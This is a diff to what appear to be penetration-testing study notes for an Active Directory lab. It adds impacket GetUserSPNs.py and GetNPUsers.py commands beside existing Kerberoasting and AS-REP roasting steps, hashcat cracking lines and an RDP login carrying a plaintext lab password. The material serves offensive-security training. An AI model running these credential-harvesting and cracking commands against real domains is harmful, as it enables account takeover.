@@ -1202,7 +1202,9 @@ Login to DC
   - crack the hash **13100 hashes.kerberoast**  
     `kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
   - Alternate tool - impacket-GetUserSPNs  
-    `kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete`  
+    `kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete`
+  - Python
+    `kali@kali:~$ GetUserSPNs.py -request -dc-ip 192.168.188.70 corp.com/`
 - AS-REP roast (accounts without preauth)
   - **DC1 pete**  
     `xfreerdp3 /u:pete /d:corp.com /p:'Nexus123!' /v:192.168.200.70 /cert:ignore /drive:share,/home/kali/share`  
@@ -1217,7 +1219,9 @@ Login to DC
   - crack the hash **18200 hashes.asreproast**  
     `kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
   - Alternate tool - Rubeus  
-    `PS C:\Tools> .\Rubeus.exe asreproast /nowrap`  
+    `PS C:\Tools> .\Rubeus.exe asreproast /nowrap`
+  - Python
+    `kali@kali:~$ GetNPUsers.py -usersfile usernames.txt -dc-ip 192.168.188.70 -format hashcat -outputfile hashes.asreproast corp.com/`  
 - Silver tickets (Forge service tickets)
 - Domain controller synchonization  
 
